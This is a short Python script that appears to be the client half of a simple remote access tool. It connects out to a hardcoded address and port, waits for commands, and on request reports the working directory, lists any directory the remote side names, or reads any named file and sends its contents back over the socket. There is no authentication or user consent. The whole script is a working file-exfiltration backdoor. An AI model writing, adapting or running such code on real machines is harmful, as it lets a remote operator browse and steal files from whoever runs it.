import socket
import os

client_socket = socket.socket()
port_number = 9999

server_address = "192.168.43.239"
client_socket.connect((server_address, port_number))

print("Connected Successfully!")

while 1:
    command = client_socket.recv(1024)
    command = command.decode()
    print("Command received successfully!")
    
    if command == "view_cwd":
        files = os.getcwd()
        files = str(files)
        client_socket.send(files.encode())
        print("Command view_cwd sent correctly!")
    
    elif command == "custom_dir":
        user_input = client_socket.recv(5000)
        user_input = user_input.decode()
        files = os.listdir(user_input)
        files = str(files)
        
        client_socket.send(files.encode())
        print("Command custom_dir sent correctly!")

    elif command == "download_files":
        filepath = client_socket.recv(5000)
        filepath = filepath.decode()
        files = open(filepath, "rb")
        data = files.read()
        client_socket.send(data)
        print("File sent correctly!")

    else:
        print("Leave")